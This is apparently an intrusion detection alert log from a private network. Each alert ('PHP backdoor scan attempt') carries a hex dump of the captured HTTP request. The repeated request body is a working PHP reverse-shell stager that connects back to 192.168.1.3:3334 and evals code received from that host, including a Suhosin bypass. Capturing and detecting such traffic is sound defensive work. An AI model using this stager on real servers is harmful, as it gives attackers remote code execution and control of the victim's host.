06/12-10:59:20.946498 [**] [1:50447:1] "POLICY-OTHER HTTP request by IPv4 address attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:39635 -> 192.168.2.2:8585

http_inspect.stream_tcp[198]:
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
48 6F 73 74 3A 20 31 39  32 2E 31 36 38 2E 32 2E  Host: 19 2.168.2.
32 3A 38 35 38 35 0D 0A  55 73 65 72 2D 41 67 65  2:8585.. User-Age
6E 74 3A 20 4D 6F 7A 69  6C 6C 61 2F 35 2E 30 20  nt: Mozi lla/5.0 
28 57 69 6E 64 6F 77 73  20 4E 54 20 31 30 2E 30  (Windows  NT 10.0
3B 20 57 69 6E 36 34 3B  20 78 36 34 29 20 41 70  ; Win64;  x64) Ap
70 6C 65 57 65 62 4B 69  74 2F 35 33 37 2E 33 36  pleWebKi t/537.36
20 28 4B 48 54 4D 4C 2C  20 6C 69 6B 65 20 47 65   (KHTML,  like Ge
63 6B 6F 29 20 43 68 72  6F 6D 65 2F 39 35 2E 30  cko) Chr ome/95.0
2E 34 36 33 38 2E 36 39  20 53 61 66 61 72 69 2F  .4638.69  Safari/
35 33 37 2E 33 36 0D 0A  43 6F 6E 74 65 6E 74 2D  537.36.. Content-
54 79 70 65 3A 20 74 65  78 74 2F 70 6C 61 69 6E  Type: te xt/plain
0D 0A 43 6F 6E 74 65 6E  74 2D 4C 65 6E 67 74 68  ..Conten t-Length
3A 20 31 31 31 32                                 : 1112
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -

06/12-10:59:20.946498 [**] [1:50447:1] "POLICY-OTHER HTTP request by IPv4 address attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:39635 -> 192.168.2.2:8585

http_inspect.stream_tcp[1112]:
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
2F 2A 3C 3F 70 68 70 20  2F 2A 2A 2F 20 65 72 72  /*<?php  /**/ err
6F 72 5F 72 65 70 6F 72  74 69 6E 67 28 30 29 3B  or_repor ting(0);
20 24 69 70 20 3D 20 27  31 39 32 2E 31 36 38 2E   $ip = ' 192.168.
31 2E 33 27 3B 20 24 70  6F 72 74 20 3D 20 33 33  1.3'; $p ort = 33
33 34 3B 20 69 66 20 28  28 24 66 20 3D 20 27 73  34; if ( ($f = 's
74 72 65 61 6D 5F 73 6F  63 6B 65 74 5F 63 6C 69  tream_so cket_cli
65 6E 74 27 29 20 26 26  20 69 73 5F 63 61 6C 6C  ent') &&  is_call
61 62 6C 65 28 24 66 29  29 20 7B 20 24 73 20 3D  able($f) ) { $s =
20 24 66 28 22 74 63 70  3A 2F 2F 7B 24 69 70 7D   $f("tcp ://{$ip}
3A 7B 24 70 6F 72 74 7D  22 29 3B 20 24 73 5F 74  :{$port} "); $s_t
79 70 65 20 3D 20 27 73  74 72 65 61 6D 27 3B 20  ype = 's tream'; 
7D 20 69 66 20 28 21 24  73 20 26 26 20 28 24 66  } if (!$ s && ($f
20 3D 20 27 66 73 6F 63  6B 6F 70 65 6E 27 29 20   = 'fsoc kopen') 
26 26 20 69 73 5F 63 61  6C 6C 61 62 6C 65 28 24  && is_ca llable($
66 29 29 20 7B 20 24 73  20 3D 20 24 66 28 24 69  f)) { $s  = $f($i
70 2C 20 24 70 6F 72 74  29 3B 20 24 73 5F 74 79  p, $port ); $s_ty
70 65 20 3D 20 27 73 74  72 65 61 6D 27 3B 20 7D  pe = 'st ream'; }
20 69 66 20 28 21 24 73  20 26 26 20 28 24 66 20   if (!$s  && ($f 
3D 20 27 73 6F 63 6B 65  74 5F 63 72 65 61 74 65  = 'socke t_create
27 29 20 26 26 20 69 73  5F 63 61 6C 6C 61 62 6C  ') && is _callabl
65 28 24 66 29 29 20 7B  20 24 73 20 3D 20 24 66  e($f)) {  $s = $f
28 41 46 5F 49 4E 45 54  2C 20 53 4F 43 4B 5F 53  (AF_INET , SOCK_S
54 52 45 41 4D 2C 20 53  4F 4C 5F 54 43 50 29 3B  TREAM, S OL_TCP);
20 24 72 65 73 20 3D 20  40 73 6F 63 6B 65 74 5F   $res =  @socket_
63 6F 6E 6E 65 63 74 28  24 73 2C 20 24 69 70 2C  connect( $s, $ip,
20 24 70 6F 72 74 29 3B  20 69 66 20 28 21 24 72   $port);  if (!$r
65 73 29 20 7B 20 64 69  65 28 29 3B 20 7D 20 24  es) { di e(); } $
73 5F 74 79 70 65 20 3D  20 27 73 6F 63 6B 65 74  s_type =  'socket
27 3B 20 7D 20 69 66 20  28 21 24 73 5F 74 79 70  '; } if  (!$s_typ
65 29 20 7B 20 64 69 65  28 27 6E 6F 20 73 6F 63  e) { die ('no soc
6B 65 74 20 66 75 6E 63  73 27 29 3B 20 7D 20 69  ket func s'); } i
66 20 28 21 24 73 29 20  7B 20 64 69 65 28 27 6E  f (!$s)  { die('n
6F 20 73 6F 63 6B 65 74  27 29 3B 20 7D 20 73 77  o socket '); } sw
69 74 63 68 20 28 24 73  5F 74 79 70 65 29 20 7B  itch ($s _type) {
20 63 61 73 65 20 27 73  74 72 65 61 6D 27 3A 20   case 's tream': 
24 6C 65 6E 20 3D 20 66  72 65 61 64 28 24 73 2C  $len = f read($s,
20 34 29 3B 20 62 72 65  61 6B 3B 20 63 61 73 65   4); bre ak; case
20 27 73 6F 63 6B 65 74  27 3A 20 24 6C 65 6E 20   'socket ': $len 
3D 20 73 6F 63 6B 65 74  5F 72 65 61 64 28 24 73  = socket _read($s
2C 20 34 29 3B 20 62 72  65 61 6B 3B 20 7D 20 69  , 4); br eak; } i
66 20 28 21 24 6C 65 6E  29 20 7B 20 64 69 65 28  f (!$len ) { die(
29 3B 20 7D 20 24 61 20  3D 20 75 6E 70 61 63 6B  ); } $a  = unpack
28 22 4E 6C 65 6E 22 2C  20 24 6C 65 6E 29 3B 20  ("Nlen",  $len); 
24 6C 65 6E 20 3D 20 24  61 5B 27 6C 65 6E 27 5D  $len = $ a['len']
3B 20 24 62 20 3D 20 27  27 3B 20 77 68 69 6C 65  ; $b = ' '; while
20 28 73 74 72 6C 65 6E  28 24 62 29 20 3C 20 24   (strlen ($b) < $
6C 65 6E 29 20 7B 20 73  77 69 74 63 68 20 28 24  len) { s witch ($
73 5F 74 79 70 65 29 20  7B 20 63 61 73 65 20 27  s_type)  { case '
73 74 72 65 61 6D 27 3A  20 24 62 20 2E 3D 20 66  stream':  $b .= f
72 65 61 64 28 24 73 2C  20 24 6C 65 6E 2D 73 74  read($s,  $len-st
72 6C 65 6E 28 24 62 29  29 3B 20 62 72 65 61 6B  rlen($b) ); break
3B 20 63 61 73 65 20 27  73 6F 63 6B 65 74 27 3A  ; case ' socket':
20 24 62 20 2E 3D 20 73  6F 63 6B 65 74 5F 72 65   $b .= s ocket_re
61 64 28 24 73 2C 20 24  6C 65 6E 2D 73 74 72 6C  ad($s, $ len-strl
65 6E 28 24 62 29 29 3B  20 62 72 65 61 6B 3B 20  en($b));  break; 
7D 20 7D 20 24 47 4C 4F  42 41 4C 53 5B 27 6D 73  } } $GLO BALS['ms
67 73 6F 63 6B 27 5D 20  3D 20 24 73 3B 20 24 47  gsock']  = $s; $G
4C 4F 42 41 4C 53 5B 27  6D 73 67 73 6F 63 6B 5F  LOBALS[' msgsock_
74 79 70 65 27 5D 20 3D  20 24 73 5F 74 79 70 65  type'] =  $s_type
3B 20 69 66 20 28 65 78  74 65 6E 73 69 6F 6E 5F  ; if (ex tension_
6C 6F 61 64 65 64 28 27  73 75 68 6F 73 69 6E 27  loaded(' suhosin'
29 20 26 26 20 69 6E 69  5F 67 65 74 28 27 73 75  ) && ini _get('su
68 6F 73 69 6E 2E 65 78  65 63 75 74 6F 72 2E 64  hosin.ex ecutor.d
69 73 61 62 6C 65 5F 65  76 61 6C 27 29 29 20 7B  isable_e val')) {
20 24 73 75 68 6F 73 69  6E 5F 62 79 70 61 73 73   $suhosi n_bypass
3D 63 72 65 61 74 65 5F  66 75 6E 63 74 69 6F 6E  =create_ function
28 27 27 2C 20 24 62 29  3B 20 24 73 75 68 6F 73  ('', $b) ; $suhos
69 6E 5F 62 79 70 61 73  73 28 29 3B 20 7D 20 65  in_bypas s(); } e
6C 73 65 20 7B 20 65 76  61 6C 28 24 62 29 3B 20  lse { ev al($b); 
7D 20 64 69 65 28 29 3B                           } die(); 
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -

06/12-10:59:20.946498 [**] [1:50182:1] "INDICATOR-SCAN PHP backdoor scan attempt" [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.1.3:39635 -> 192.168.2.2:8585

http_inspect.stream_tcp[1112]:
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
2F 2A 3C 3F 70 68 70 20  2F 2A 2A 2F 20 65 72 72  /*<?php  /**/ err
6F 72 5F 72 65 70 6F 72  74 69 6E 67 28 30 29 3B  or_repor ting(0);
20 24 69 70 20 3D 20 27  31 39 32 2E 31 36 38 2E   $ip = ' 192.168.
31 2E 33 27 3B 20 24 70  6F 72 74 20 3D 20 33 33  1.3'; $p ort = 33
33 34 3B 20 69 66 20 28  28 24 66 20 3D 20 27 73  34; if ( ($f = 's
74 72 65 61 6D 5F 73 6F  63 6B 65 74 5F 63 6C 69  tream_so cket_cli
65 6E 74 27 29 20 26 26  20 69 73 5F 63 61 6C 6C  ent') &&  is_call
61 62 6C 65 28 24 66 29  29 20 7B 20 24 73 20 3D  able($f) ) { $s =
20 24 66 28 22 74 63 70  3A 2F 2F 7B 24 69 70 7D   $f("tcp ://{$ip}
3A 7B 24 70 6F 72 74 7D  22 29 3B 20 24 73 5F 74  :{$port} "); $s_t
79 70 65 20 3D 20 27 73  74 72 65 61 6D 27 3B 20  ype = 's tream'; 
7D 20 69 66 20 28 21 24  73 20 26 26 20 28 24 66  } if (!$ s && ($f
20 3D 20 27 66 73 6F 63  6B 6F 70 65 6E 27 29 20   = 'fsoc kopen') 
26 26 20 69 73 5F 63 61  6C 6C 61 62 6C 65 28 24  && is_ca llable($
66 29 29 20 7B 20 24 73  20 3D 20 24 66 28 24 69  f)) { $s  = $f($i
70 2C 20 24 70 6F 72 74  29 3B 20 24 73 5F 74 79  p, $port ); $s_ty
70 65 20 3D 20 27 73 74  72 65 61 6D 27 3B 20 7D  pe = 'st ream'; }
20 69 66 20 28 21 24 73  20 26 26 20 28 24 66 20   if (!$s  && ($f 
3D 20 27 73 6F 63 6B 65  74 5F 63 72 65 61 74 65  = 'socke t_create
27 29 20 26 26 20 69 73  5F 63 61 6C 6C 61 62 6C  ') && is _callabl
65 28 24 66 29 29 20 7B  20 24 73 20 3D 20 24 66  e($f)) {  $s = $f
28 41 46 5F 49 4E 45 54  2C 20 53 4F 43 4B 5F 53  (AF_INET , SOCK_S
54 52 45 41 4D 2C 20 53  4F 4C 5F 54 43 50 29 3B  TREAM, S OL_TCP);
20 24 72 65 73 20 3D 20  40 73 6F 63 6B 65 74 5F   $res =  @socket_
63 6F 6E 6E 65 63 74 28  24 73 2C 20 24 69 70 2C  connect( $s, $ip,
20 24 70 6F 72 74 29 3B  20 69 66 20 28 21 24 72   $port);  if (!$r
65 73 29 20 7B 20 64 69  65 28 29 3B 20 7D 20 24  es) { di e(); } $
73 5F 74 79 70 65 20 3D  20 27 73 6F 63 6B 65 74  s_type =  'socket
27 3B 20 7D 20 69 66 20  28 21 24 73 5F 74 79 70  '; } if  (!$s_typ
65 29 20 7B 20 64 69 65  28 27 6E 6F 20 73 6F 63  e) { die ('no soc
6B 65 74 20 66 75 6E 63  73 27 29 3B 20 7D 20 69  ket func s'); } i
66 20 28 21 24 73 29 20  7B 20 64 69 65 28 27 6E  f (!$s)  { die('n
6F 20 73 6F 63 6B 65 74  27 29 3B 20 7D 20 73 77  o socket '); } sw
69 74 63 68 20 28 24 73  5F 74 79 70 65 29 20 7B  itch ($s _type) {
20 63 61 73 65 20 27 73  74 72 65 61 6D 27 3A 20   case 's tream': 
24 6C 65 6E 20 3D 20 66  72 65 61 64 28 24 73 2C  $len = f read($s,
20 34 29 3B 20 62 72 65  61 6B 3B 20 63 61 73 65   4); bre ak; case
20 27 73 6F 63 6B 65 74  27 3A 20 24 6C 65 6E 20   'socket ': $len 
3D 20 73 6F 63 6B 65 74  5F 72 65 61 64 28 24 73  = socket _read($s
2C 20 34 29 3B 20 62 72  65 61 6B 3B 20 7D 20 69  , 4); br eak; } i
66 20 28 21 24 6C 65 6E  29 20 7B 20 64 69 65 28  f (!$len ) { die(
29 3B 20 7D 20 24 61 20  3D 20 75 6E 70 61 63 6B  ); } $a  = unpack
28 22 4E 6C 65 6E 22 2C  20 24 6C 65 6E 29 3B 20  ("Nlen",  $len); 
24 6C 65 6E 20 3D 20 24  61 5B 27 6C 65 6E 27 5D  $len = $ a['len']
3B 20 24 62 20 3D 20 27  27 3B 20 77 68 69 6C 65  ; $b = ' '; while
20 28 73 74 72 6C 65 6E  28 24 62 29 20 3C 20 24   (strlen ($b) < $
6C 65 6E 29 20 7B 20 73  77 69 74 63 68 20 28 24  len) { s witch ($
73 5F 74 79 70 65 29 20  7B 20 63 61 73 65 20 27  s_type)  { case '
73 74 72 65 61 6D 27 3A  20 24 62 20 2E 3D 20 66  stream':  $b .= f
72 65 61 64 28 24 73 2C  20 24 6C 65 6E 2D 73 74  read($s,  $len-st
72 6C 65 6E 28 24 62 29  29 3B 20 62 72 65 61 6B  rlen($b) ); break
3B 20 63 61 73 65 20 27  73 6F 63 6B 65 74 27 3A  ; case ' socket':
20 24 62 20 2E 3D 20 73  6F 63 6B 65 74 5F 72 65   $b .= s ocket_re
61 64 28 24 73 2C 20 24  6C 65 6E 2D 73 74 72 6C  ad($s, $ len-strl
65 6E 28 24 62 29 29 3B  20 62 72 65 61 6B 3B 20  en($b));  break; 
7D 20 7D 20 24 47 4C 4F  42 41 4C 53 5B 27 6D 73  } } $GLO BALS['ms
67 73 6F 63 6B 27 5D 20  3D 20 24 73 3B 20 24 47  gsock']  = $s; $G
4C 4F 42 41 4C 53 5B 27  6D 73 67 73 6F 63 6B 5F  LOBALS[' msgsock_
74 79 70 65 27 5D 20 3D  20 24 73 5F 74 79 70 65  type'] =  $s_type
3B 20 69 66 20 28 65 78  74 65 6E 73 69 6F 6E 5F  ; if (ex tension_
6C 6F 61 64 65 64 28 27  73 75 68 6F 73 69 6E 27  loaded(' suhosin'
29 20 26 26 20 69 6E 69  5F 67 65 74 28 27 73 75  ) && ini _get('su
68 6F 73 69 6E 2E 65 78  65 63 75 74 6F 72 2E 64  hosin.ex ecutor.d
69 73 61 62 6C 65 5F 65  76 61 6C 27 29 29 20 7B  isable_e val')) {
20 24 73 75 68 6F 73 69  6E 5F 62 79 70 61 73 73   $suhosi n_bypass
3D 63 72 65 61 74 65 5F  66 75 6E 63 74 69 6F 6E  =create_ function
28 27 27 2C 20 24 62 29  3B 20 24 73 75 68 6F 73  ('', $b) ; $suhos
69 6E 5F 62 79 70 61 73  73 28 29 3B 20 7D 20 65  in_bypas s(); } e
6C 73 65 20 7B 20 65 76  61 6C 28 24 62 29 3B 20  lse { ev al($b); 
7D 20 64 69 65 28 29 3B                           } die(); 
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -

06/12-10:59:20.999477 [**] [1:50447:1] "POLICY-OTHER HTTP request by IPv4 address attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:35073 -> 192.168.2.2:8585

http_inspect.stream_tcp[198]:
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
48 6F 73 74 3A 20 31 39  32 2E 31 36 38 2E 32 2E  Host: 19 2.168.2.
32 3A 38 35 38 35 0D 0A  55 73 65 72 2D 41 67 65  2:8585.. User-Age
6E 74 3A 20 4D 6F 7A 69  6C 6C 61 2F 35 2E 30 20  nt: Mozi lla/5.0 
28 57 69 6E 64 6F 77 73  20 4E 54 20 31 30 2E 30  (Windows  NT 10.0
3B 20 57 69 6E 36 34 3B  20 78 36 34 29 20 41 70  ; Win64;  x64) Ap
70 6C 65 57 65 62 4B 69  74 2F 35 33 37 2E 33 36  pleWebKi t/537.36
20 28 4B 48 54 4D 4C 2C  20 6C 69 6B 65 20 47 65   (KHTML,  like Ge
63 6B 6F 29 20 43 68 72  6F 6D 65 2F 39 35 2E 30  cko) Chr ome/95.0
2E 34 36 33 38 2E 36 39  20 53 61 66 61 72 69 2F  .4638.69  Safari/
35 33 37 2E 33 36 0D 0A  43 6F 6E 74 65 6E 74 2D  537.36.. Content-
54 79 70 65 3A 20 74 65  78 74 2F 70 6C 61 69 6E  Type: te xt/plain
0D 0A 43 6F 6E 74 65 6E  74 2D 4C 65 6E 67 74 68  ..Conten t-Length
3A 20 31 31 31 32                                 : 1112
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -

06/12-10:59:20.999477 [**] [1:50447:1] "POLICY-OTHER HTTP request by IPv4 address attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:35073 -> 192.168.2.2:8585

http_inspect.stream_tcp[1112]:
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
2F 2A 3C 3F 70 68 70 20  2F 2A 2A 2F 20 65 72 72  /*<?php  /**/ err
6F 72 5F 72 65 70 6F 72  74 69 6E 67 28 30 29 3B  or_repor ting(0);
20 24 69 70 20 3D 20 27  31 39 32 2E 31 36 38 2E   $ip = ' 192.168.
31 2E 33 27 3B 20 24 70  6F 72 74 20 3D 20 33 33  1.3'; $p ort = 33
33 34 3B 20 69 66 20 28  28 24 66 20 3D 20 27 73  34; if ( ($f = 's
74 72 65 61 6D 5F 73 6F  63 6B 65 74 5F 63 6C 69  tream_so cket_cli
65 6E 74 27 29 20 26 26  20 69 73 5F 63 61 6C 6C  ent') &&  is_call
61 62 6C 65 28 24 66 29  29 20 7B 20 24 73 20 3D  able($f) ) { $s =
20 24 66 28 22 74 63 70  3A 2F 2F 7B 24 69 70 7D   $f("tcp ://{$ip}
3A 7B 24 70 6F 72 74 7D  22 29 3B 20 24 73 5F 74  :{$port} "); $s_t
79 70 65 20 3D 20 27 73  74 72 65 61 6D 27 3B 20  ype = 's tream'; 
7D 20 69 66 20 28 21 24  73 20 26 26 20 28 24 66  } if (!$ s && ($f
20 3D 20 27 66 73 6F 63  6B 6F 70 65 6E 27 29 20   = 'fsoc kopen') 
26 26 20 69 73 5F 63 61  6C 6C 61 62 6C 65 28 24  && is_ca llable($
66 29 29 20 7B 20 24 73  20 3D 20 24 66 28 24 69  f)) { $s  = $f($i
70 2C 20 24 70 6F 72 74  29 3B 20 24 73 5F 74 79  p, $port ); $s_ty
70 65 20 3D 20 27 73 74  72 65 61 6D 27 3B 20 7D  pe = 'st ream'; }
20 69 66 20 28 21 24 73  20 26 26 20 28 24 66 20   if (!$s  && ($f 
3D 20 27 73 6F 63 6B 65  74 5F 63 72 65 61 74 65  = 'socke t_create
27 29 20 26 26 20 69 73  5F 63 61 6C 6C 61 62 6C  ') && is _callabl
65 28 24 66 29 29 20 7B  20 24 73 20 3D 20 24 66  e($f)) {  $s = $f
28 41 46 5F 49 4E 45 54  2C 20 53 4F 43 4B 5F 53  (AF_INET , SOCK_S
54 52 45 41 4D 2C 20 53  4F 4C 5F 54 43 50 29 3B  TREAM, S OL_TCP);
20 24 72 65 73 20 3D 20  40 73 6F 63 6B 65 74 5F   $res =  @socket_
63 6F 6E 6E 65 63 74 28  24 73 2C 20 24 69 70 2C  connect( $s, $ip,
20 24 70 6F 72 74 29 3B  20 69 66 20 28 21 24 72   $port);  if (!$r
65 73 29 20 7B 20 64 69  65 28 29 3B 20 7D 20 24  es) { di e(); } $
73 5F 74 79 70 65 20 3D  20 27 73 6F 63 6B 65 74  s_type =  'socket
27 3B 20 7D 20 69 66 20  28 21 24 73 5F 74 79 70  '; } if  (!$s_typ
65 29 20 7B 20 64 69 65  28 27 6E 6F 20 73 6F 63  e) { die ('no soc
6B 65 74 20 66 75 6E 63  73 27 29 3B 20 7D 20 69  ket func s'); } i
66 20 28 21 24 73 29 20  7B 20 64 69 65 28 27 6E  f (!$s)  { die('n
6F 20 73 6F 63 6B 65 74  27 29 3B 20 7D 20 73 77  o socket '); } sw
69 74 63 68 20 28 24 73  5F 74 79 70 65 29 20 7B  itch ($s _type) {
20 63 61 73 65 20 27 73  74 72 65 61 6D 27 3A 20   case 's tream': 
24 6C 65 6E 20 3D 20 66  72 65 61 64 28 24 73 2C  $len = f read($s,
20 34 29 3B 20 62 72 65  61 6B 3B 20 63 61 73 65   4); bre ak; case
20 27 73 6F 63 6B 65 74  27 3A 20 24 6C 65 6E 20   'socket ': $len 
3D 20 73 6F 63 6B 65 74  5F 72 65 61 64 28 24 73  = socket _read($s
2C 20 34 29 3B 20 62 72  65 61 6B 3B 20 7D 20 69  , 4); br eak; } i
66 20 28 21 24 6C 65 6E  29 20 7B 20 64 69 65 28  f (!$len ) { die(
29 3B 20 7D 20 24 61 20  3D 20 75 6E 70 61 63 6B  ); } $a  = unpack
28 22 4E 6C 65 6E 22 2C  20 24 6C 65 6E 29 3B 20  ("Nlen",  $len); 
24 6C 65 6E 20 3D 20 24  61 5B 27 6C 65 6E 27 5D  $len = $ a['len']
3B 20 24 62 20 3D 20 27  27 3B 20 77 68 69 6C 65  ; $b = ' '; while
20 28 73 74 72 6C 65 6E  28 24 62 29 20 3C 20 24   (strlen ($b) < $
6C 65 6E 29 20 7B 20 73  77 69 74 63 68 20 28 24  len) { s witch ($
73 5F 74 79 70 65 29 20  7B 20 63 61 73 65 20 27  s_type)  { case '
73 74 72 65 61 6D 27 3A  20 24 62 20 2E 3D 20 66  stream':  $b .= f
72 65 61 64 28 24 73 2C  20 24 6C 65 6E 2D 73 74  read($s,  $len-st
72 6C 65 6E 28 24 62 29  29 3B 20 62 72 65 61 6B  rlen($b) ); break
3B 20 63 61 73 65 20 27  73 6F 63 6B 65 74 27 3A  ; case ' socket':
20 24 62 20 2E 3D 20 73  6F 63 6B 65 74 5F 72 65   $b .= s ocket_re
61 64 28 24 73 2C 20 24  6C 65 6E 2D 73 74 72 6C  ad($s, $ len-strl
65 6E 28 24 62 29 29 3B  20 62 72 65 61 6B 3B 20  en($b));  break; 
7D 20 7D 20 24 47 4C 4F  42 41 4C 53 5B 27 6D 73  } } $GLO BALS['ms
67 73 6F 63 6B 27 5D 20  3D 20 24 73 3B 20 24 47  gsock']  = $s; $G
4C 4F 42 41 4C 53 5B 27  6D 73 67 73 6F 63 6B 5F  LOBALS[' msgsock_
74 79 70 65 27 5D 20 3D  20 24 73 5F 74 79 70 65  type'] =  $s_type
3B 20 69 66 20 28 65 78  74 65 6E 73 69 6F 6E 5F  ; if (ex tension_
6C 6F 61 64 65 64 28 27  73 75 68 6F 73 69 6E 27  loaded(' suhosin'
29 20 26 26 20 69 6E 69  5F 67 65 74 28 27 73 75  ) && ini _get('su
68 6F 73 69 6E 2E 65 78  65 63 75 74 6F 72 2E 64  hosin.ex ecutor.d
69 73 61 62 6C 65 5F 65  76 61 6C 27 29 29 20 7B  isable_e val')) {
20 24 73 75 68 6F 73 69  6E 5F 62 79 70 61 73 73   $suhosi n_bypass
3D 63 72 65 61 74 65 5F  66 75 6E 63 74 69 6F 6E  =create_ function
28 27 27 2C 20 24 62 29  3B 20 24 73 75 68 6F 73  ('', $b) ; $suhos
69 6E 5F 62 79 70 61 73  73 28 29 3B 20 7D 20 65  in_bypas s(); } e
6C 73 65 20 7B 20 65 76  61 6C 28 24 62 29 3B 20  lse { ev al($b); 
7D 20 64 69 65 28 29 3B                           } die(); 
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -

06/12-10:59:20.999477 [**] [1:50182:1] "INDICATOR-SCAN PHP backdoor scan attempt" [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.1.3:35073 -> 192.168.2.2:8585

http_inspect.stream_tcp[1112]:
- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
2F 2A 3C 3F 70 68 70 20  2F 2A 2A 2F 20 65 72 72  /*<?php  /**/ err
6F 72 5F 72 65 70 6F 72  74 69 6E 67 28 30 29 3B  or_repor ting(0);
20 24 69 70 20 3D 20 27  31 39 32 2E 31 36 38 2E   $ip = ' 192.168.
31 2E 33 27 3B 20 24 70  6F 72 74 20 3D 20 33 33  1.3'; $p ort = 33
33 34 3B 20 69 66 20 28  28 24 66 20 3D 20 27 73  34; if ( ($f = 's
74 72 65 61 6D 5F 73 6F  63 6B 65 74 5F 63 6C 69  tream_so cket_cli
65 6E 74 27 29 20 26 26  20 69 73 5F 63 61 6C 6C  ent') &&  is_call
61 62 6C 65 28 24 66 29  29 20 7B 20 24 73 20 3D  able($f) ) { $s =
20 24 66 28 22 74 63 70  3A 2F 2F 7B 24 69 70 7D   $f("tcp ://{$ip}
3A 7B 24 70 6F 72 74 7D  22 29 3B 20 24 73 5F 74  :{$port} "); $s_t
79 70 65 20 3D 20 27 73  74 72 65 61 6D 27 3B 20  ype = 's tream'; 
7D 20 69 66 20 28 21 24  73 20 26 26 20 28 24 66  } if (!$ s && ($f
20 3D 20 27 66 73 6F 63  6B 6F 70 65 6E 27 29 20   = 'fsoc kopen') 
26 26 20 69 73 5F 63 61  6C 6C 61 62 6C 65 28 24  && is_ca llable($
66 29 29 20 7B 20 24 73  20 3D 20 24 66 28 24 69  f)) { $s  = $f($i
70 2C 20 24 70 6F 72 74  29 3B 20 24 73 5F 74 79  p, $port ); $s_ty
70 65 20 3D 20 27 73 74  72 65 61 6D 27 3B 20 7D  pe = 'st ream'; }
20 69 66 20 28 21 24 73  20 26 26 20 28 24 66 20   if (!$s  && ($f 
3D 20 27 73 6F 63 6B 65  74 5F 63 72 65 61 74 65  = 'socke t_create
27 29 20 26 26 20 69 73  5F 63 61 6C 6C 61 62 6C  ') && is _callabl
65 28 24 66 29 29 20 7B  20 24 73 20 3D 20 24 66  e($f)) {  $s = $f
28 41 46 5F 49 4E 45 54  2C 20 53 4F 43 4B 5F 53  (AF_INET , SOCK_S
54 52 45 41 4D 2C 20 53  4F 4C 5F 54 43 50 29 3B  TREAM, S OL_TCP);
20 24 72 65 73 20 3D 20  40 73 6F 63 6B 65 74 5F   $res =  @socket_
63 6F 6E 6E 65 63 74 28  24 73 2C 20 24 69 70 2C  connect( $s, $ip,
20 24 70 6F 72 74 29 3B  20 69 66 20 28 21 24 72   $port);  if (!$r
65 73 29 20 7B 20 64 69  65 28 29 3B 20 7D 20 24  es) { di e(); } $
73 5F 74 79 70 65 20 3D  20 27 73 6F 63 6B 65 74  s_type =  'socket
27 3B 20 7D 20 69 66 20  28 21 24 73 5F 74 79 70  '; } if  (!$s_typ
65 29 20 7B 20 64 69 65  28 27 6E 6F 20 73 6F 63  e) { die ('no soc
6B 65 74 20 66 75 6E 63  73 27 29 3B 20 7D 20 69  ket func s'); } i
66 20 28 21 24 73 29 20  7B 20 64 69 65 28 27 6E  f (!$s)  { die('n
6F 20 73 6F 63 6B 65 74  27 29 3B 20 7D 20 73 77  o socket '); } sw
69 74 63 68 20 28 24 73  5F 74 79 70 65 29 20 7B  itch ($s _type) {
20 63 61 73 65 20 27 73  74 72 65 61 6D 27 3A 20   case 's tream': 
24 6C 65 6E 20 3D 20 66  72 65 61 64 28 24 73 2C  $len = f read($s,
20 34 29 3B 20 62 72 65  61 6B 3B 20 63 61 73 65   4); bre ak; case
20 27 73 6F 63 6B 65 74  27 3A 20 24 6C 65 6E 20   'socket ': $len 
3D 20 73 6F 63 6B 65 74  5F 72 65 61 64 28 24 73  = socket _read($s
2C 20 34 29 3B 20 62 72  65 61 6B 3B 20 7D 20 69  , 4); br eak; } i
66 20 28 21 24 6C 65 6E  29 20 7B 20 64 69 65 28  f (!$len ) { die(
29 3B 20 7D 20 24 61 20  3D 20 75 6E 70 61 63 6B  ); } $a  = unpack
28 22 4E 6C 65 6E 22 2C  20 24 6C 65 6E 29 3B 20  ("Nlen",  $len); 
24 6C 65 6E 20 3D 20 24  61 5B 27 6C 65 6E 27 5D  $len = $ a['len']
3B 20 24 62 20 3D 20 27  27 3B 20 77 68 69 6C 65  ; $b = ' '; while
20 28 73 74 72 6C 65 6E  28 24 62 29 20 3C 20 24   (strlen ($b) < $
6C 65 6E 29 20 7B 20 73  77 69 74 63 68 20 28 24  len) { s witch ($
73 5F 74 79 70 65 29 20  7B 20 63 61 73 65 20 27  s_type)  { case '
73 74 72 65 61 6D 27 3A  20 24 62 20 2E 3D 20 66  stream':  $b .= f
72 65 61 64 28 24 73 2C  20 24 6C 65 6E 2D 73 74  read($s,  $len-st
72 6C 65 6E 28 24 62 29  29 3B 20 62 72 65 61 6B  rlen($b) ); break
3B 20 63 61 73 65 20 27  73 6F 63 6B 65 74 27 3A  ; case ' socket':
20 24 62 20 2E 3D 20 73  6F 63 6B 65 74 5F 72 65   $b .= s ocket_re
61 64 28 24 73 2C 20 24  6C 65 6E 2D 73 74 72 6C  ad($s, $ len-strl
65 6E 28 24 62 29 29 3B  20 62 72 65 61 6B 3B 20  en($b));  break; 
7D 20 7D 20 24 47 4C 4F  42 41 4C 53 5B 27 6D 73  } } $GLO BALS['ms
67 73 6F 63 6B 27 5D 20  3D 20 24 73 3B 20 24 47  gsock']  = $s; $G
4C 4F 42 41 4C 53 5B 27  6D 73 67 73 6F 63 6B 5F  LOBALS[' msgsock_
74 79 70 65 27 5D 20 3D  20 24 73 5F 74 79 70 65  type'] =  $s_type
3B 20 69 66 20 28 65 78  74 65 6E 73 69 6F 6E 5F  ; if (ex tension_
6C 6F 61 64 65 64 28 27  73 75 68 6F 73 69 6E 27  loaded(' suhosin'
